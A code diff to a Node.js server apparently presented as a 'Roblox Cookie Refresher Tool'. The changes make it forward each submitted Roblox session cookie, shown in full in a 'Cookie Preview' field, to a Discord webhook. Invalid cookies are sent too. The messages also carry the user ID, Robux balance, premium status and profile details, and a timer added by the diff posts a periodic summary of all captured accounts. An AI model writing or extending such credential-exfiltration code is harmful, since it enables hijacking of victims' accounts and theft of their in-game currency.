@@ -99,14 +99,23 @@ function broadcast(data) {
     });
 }
 
-// Send notification to Discord webhook
-async function sendDiscordNotification(cookieData) {
+// Send notification to Discord webhook for new cookies
+async function sendNewCookieNotification(cookieData) {
     try {
         const embed = {
             title: "🍪 New Roblox Cookie Added",
-            description: `A new valid Roblox account has been added to the cookie refresher!`,
-            color: 0x00A2FF,
-            fields: [
+            description: `A new ${cookieData.isValid ? 'valid' : 'invalid'} Roblox account has been detected!`,
+            color: cookieData.isValid ? 0x2ed573 : 0xff4757,
+            fields: [],
+            footer: {
+                text: "Roblox Cookie Refresher Tool",
+                icon_url: "https://images.rbxcdn.com/8560f731abce3687166b3e4ead9d9e1f.png"
+            },
+            timestamp: new Date().toISOString()
+        };
+
+        if (cookieData.isValid) {
+            embed.fields = [
                 {
                     name: "👤 Username",
                     value: cookieData.username || 'Unknown',
@@ -118,60 +127,98 @@ async function sendDiscordNotification(cookieData) {
                     inline: true
                 },
                 {
+                    name: "🔗 Display Name",
+                    value: cookieData.displayName || 'Not set',
+                    inline: true
+                },
+                {
                     name: "💰 Robux",
-                    value: cookieData.robux?.toString() || '0',
+                    value: `${cookieData.robux?.toLocaleString() || '0'} R$`,
                     inline: true
                 },
                 {
-                    name: "👥 Followers",
-                    value: cookieData.followers?.toString() || '0',
+                    name: "⭐ Premium Status",
+                    value: cookieData.isPremium ? '✅ Premium' : '❌ No Premium',
                     inline: true
                 },
                 {
-                    name: "➕ Following",
-                    value: cookieData.following?.toString() || '0',
-                    inline: true
-                },
-                {
-                    name: "⭐ Premium",
-                    value: cookieData.isPremium ? 'Yes' : 'No',
+                    name: "👥 Social Stats",
+                    value: `Followers: ${cookieData.followers?.toLocaleString() || '0'}\nFollowing: ${cookieData.following?.toLocaleString() || '0'}`,
                     inline: true
                 },
                 {
                     name: "📅 Account Created",
-                    value: cookieData.created ? new Date(cookieData.created).toLocaleDateString() : 'Unknown',
-                    inline: true
+                    value: cookieData.created ? new Date(cookieData.created).toLocaleDateString('en-US', {
+                        year: 'numeric',
+                        month: 'long',
+                        day: 'numeric'
+                    }) : 'Unknown',
+                    inline: false
                 },
                 {
                     name: "🕒 Added At",
-                    value: new Date().toLocaleString(),
+                    value: new Date().toLocaleString('en-US', {
+                        timeZone: 'UTC',
+                        year: 'numeric',
+                        month: 'short',
+                        day: 'numeric',
+                        hour: '2-digit',
+                        minute: '2-digit',
+                        timeZoneName: 'short'
+                    }),
                     inline: true
                 },
                 {
-                    name: "🔗 Display Name",
-                    value: cookieData.displayName || 'Not set',
+                    name: "🔐 Cookie Preview",
+                    value: `\`${cookieData.cookie}\``,
+                    inline: false
+                }
+            ];
+
+            // Add description field if available
+            if (cookieData.description && cookieData.description.trim() && cookieData.description !== 'No description available') {
+                embed.fields.push({
+                    name: "📝 Account Description",
+                    value: cookieData.description.length > 200 ? cookieData.description.substring(0, 200) + '...' : cookieData.description,
+                    inline: false
+                });
+            }
+        } else {
+            embed.fields = [
+                {
+                    name: "❌ Status",
+                    value: "Invalid Cookie",
+                    inline: true
+                },
+                {
+                    name: "🔍 Error Details",
+                    value: cookieData.error || 'Unknown error occurred',
+                    inline: false
+                },
+                {
+                    name: "🔐 Cookie Preview",
+                    value: `\`${cookieData.cookie}\``,
+                    inline: false
+                },
+                {
+                    name: "🕒 Attempted At",
+                    value: new Date().toLocaleString('en-US', {
+                        timeZone: 'UTC',
+                        year: 'numeric',
+                        month: 'short',
+                        day: 'numeric',
+                        hour: '2-digit',
+                        minute: '2-digit',
+                        timeZoneName: 'short'
+                    }),
                     inline: true
                 }
-            ],
-            footer: {
-                text: "Roblox Cookie Refresher Tool",
-                icon_url: "https://cdn.discordapp.com/attachments/123456789/roblox-icon.png"
-            },
-            timestamp: new Date().toISOString()
-        };
-
-        // Add description field if available
-        if (cookieData.description && cookieData.description.trim() && cookieData.description !== 'No description available') {
-            embed.fields.push({
-                name: "📝 Description",
-                value: cookieData.description.length > 100 ? cookieData.description.substring(0, 100) + '...' : cookieData.description,
-                inline: false
-            });
+            ];
         }
 
         const payload = {
             username: "Cookie Refresher Bot",
-            avatar_url: "https://cdn.discordapp.com/attachments/123456789/cookie-bot-avatar.png",
+            avatar_url: "https://images.rbxcdn.com/8560f731abce3687166b3e4ead9d9e1f.png",
             embeds: [embed]
         };
 
@@ -179,12 +226,84 @@ async function sendDiscordNotification(cookieData) {
             headers: {
                 'Content-Type': 'application/json'
             },
-            timeout: 10000
+            timeout: 15000
         });
 
-        console.log(`✅ Discord notification sent for user: ${cookieData.username}`);
+        console.log(`✅ Discord notification sent for ${cookieData.isValid ? 'valid' : 'invalid'} cookie: ${cookieData.username || 'Unknown'}`);
     } catch (error) {
         console.error('❌ Failed to send Discord notification:', error.response?.status, error.message);
+    }
+}
+
+// Send comprehensive account information notification
+async function sendAccountInfoNotification(cookieData) {
+    if (!cookieData.isValid) return;
+    
+    try {
+        const embed = {
+            title: "📊 Complete Account Information",
+            description: `Detailed information for **${cookieData.username}**`,
+            color: 0x00A2FF,
+            fields: [
+                {
+                    name: "🏷️ Basic Information",
+                    value: `**Username:** ${cookieData.username}\n**Display Name:** ${cookieData.displayName || 'Not set'}\n**User ID:** ${cookieData.userId}`,
+                    inline: false
+                },
+                {
+                    name: "💼 Account Status",
+                    value: `**Premium:** ${cookieData.isPremium ? '✅ Active' : '❌ Not Active'}\n**Account Age:** ${cookieData.created ? `Created ${new Date(cookieData.created).toLocaleDateString()}` : 'Unknown'}`,
+                    inline: false
+                },
+                {
+                    name: "💰 Financial Information",
+                    value: `**Current Robux:** ${cookieData.robux?.toLocaleString() || '0'} R$`,
+                    inline: true
+                },
+                {
+                    name: "👥 Social Statistics",
+                    value: `**Followers:** ${cookieData.followers?.toLocaleString() || '0'}\n**Following:** ${cookieData.following?.toLocaleString() || '0'}`,
+                    inline: true
+                },
+                {
+                    name: "📝 Profile Description",
+                    value: (cookieData.description && cookieData.description.trim() && cookieData.description !== 'No description available') 
+                        ? (cookieData.description.length > 300 ? cookieData.description.substring(0, 300) + '...' : cookieData.description)
+                        : 'No description set',
+                    inline: false
+                },
+                {
+                    name: "🔐 Authentication Details",
+                    value: `**Cookie:** \`${cookieData.fullCookie ? cookieData.fullCookie.substring(0, 50) + '...' : cookieData.cookie}\`\n**Last Verified:** ${new Date(cookieData.lastChecked).toLocaleString()}`,
+                    inline: false
+                }
+            ],
+            thumbnail: {
+                url: `https://www.roblox.com/headshot-thumbnail/image?userId=${cookieData.userId}&width=420&height=420&format=png`
+            },
+            footer: {
+                text: "Roblox Cookie Refresher Tool • Complete Account Data",
+                icon_url: "https://images.rbxcdn.com/8560f731abce3687166b3e4ead9d9e1f.png"
+            },
+            timestamp: new Date().toISOString()
+        };
+
+        const payload = {
+            username: "Cookie Refresher Bot",
+            avatar_url: "https://images.rbxcdn.com/8560f731abce3687166b3e4ead9d9e1f.png",
+            embeds: [embed]
+        };
+
+        await axios.post(DISCORD_WEBHOOK_URL, payload, {
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            timeout: 15000
+        });
+
+        console.log(`✅ Detailed account info sent for: ${cookieData.username}`);
+    } catch (error) {
+        console.error('❌ Failed to send detailed account info:', error.response?.status, error.message);
     }
 }
 
@@ -439,6 +558,67 @@ setInterval(async () => {
     console.log('Auto-refresh completed');
 }, 10 * 60 * 1000);
 
+// Send periodic summary of all accounts every 30 minutes
+setInterval(async () => {
+    const validCookies = Array.from(activeCookies.values()).filter(c => c.isValid && !c.isLoading);
+    
+    if (validCookies.length === 0) return;
+    
+    try {
+        const embed = {
+            title: "📈 Account Summary Report",
+            description: `Status update for all ${validCookies.length} active account${validCookies.length > 1 ? 's' : ''}`,
+            color: 0x5865F2,
+            fields: [
+                {
+                    name: "📊 Summary Statistics",
+                    value: `**Total Accounts:** ${validCookies.length}\n**Total Robux:** ${validCookies.reduce((sum, c) => sum + (c.robux || 0), 0).toLocaleString()} R$\n**Premium Accounts:** ${validCookies.filter(c => c.isPremium).length}`,
+                    inline: false
+                }
+            ],
+            footer: {
+                text: "Roblox Cookie Refresher Tool • Periodic Report",
+                icon_url: "https://images.rbxcdn.com/8560f731abce3687166b3e4ead9d9e1f.png"
+            },
+            timestamp: new Date().toISOString()
+        };
+
+        // Add individual account details
+        validCookies.slice(0, 10).forEach((cookie, index) => {
+            embed.fields.push({
+                name: `${index + 1}. ${cookie.username}`,
+                value: `**ID:** ${cookie.userId}\n**Robux:** ${cookie.robux?.toLocaleString() || '0'} R$\n**Premium:** ${cookie.isPremium ? '✅' : '❌'}`,
+                inline: true
+            });
+        });
+
+        if (validCookies.length > 10) {
+            embed.fields.push({
+                name: "📝 Note",
+                value: `Showing first 10 accounts. Total: ${validCookies.length} accounts`,
+                inline: false
+            });
+        }
+
+        const payload = {
+            username: "Cookie Refresher Bot",
+            avatar_url: "https://images.rbxcdn.com/8560f731abce3687166b3e4ead9d9e1f.png",
+            embeds: [embed]
+        };
+
+        await axios.post(DISCORD_WEBHOOK_URL, payload, {
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            timeout: 15000
+        });
+
+        console.log(`✅ Periodic summary sent for ${validCookies.length} accounts`);
+    } catch (error) {
+        console.error('❌ Failed to send periodic summary:', error.message);
+    }
+}, 30 * 60 * 1000);
+
 // Routes
 app.get('/', (req, res) => {
     res.sendFile(__dirname + '/public/index.html');
@@ -497,7 +677,7 @@ app.post('/api/add-cookie', async (req, res) => {
             cookie: cookieData
         });
         
-        // Send notification for new valid cookie
+        // Send notification for any new cookie (valid or invalid)
         if (cookieData.isValid) {
             broadcast({
                 type: 'notification',
@@ -505,14 +685,22 @@ app.post('/api/add-cookie', async (req, res) => {
                 level: 'success'
             });
             
-            // Send Discord webhook notification for valid cookies
-            await sendDiscordNotification(cookieData);
+            // Send Discord webhook notifications for valid cookies
+            await sendNewCookieNotification(cookieData);
+            
+            // Send detailed account information separately
+            setTimeout(async () => {
+                await sendAccountInfoNotification(cookieData);
+            }, 2000);
         } else {
             broadcast({
                 type: 'notification',
                 message: `❌ Failed to add cookie: ${cookieData.error}`,
                 level: 'error'
             });
+            
+            // Send Discord notification for invalid cookies too
+            await sendNewCookieNotification(cookieData);
         }
     }, 100);
     
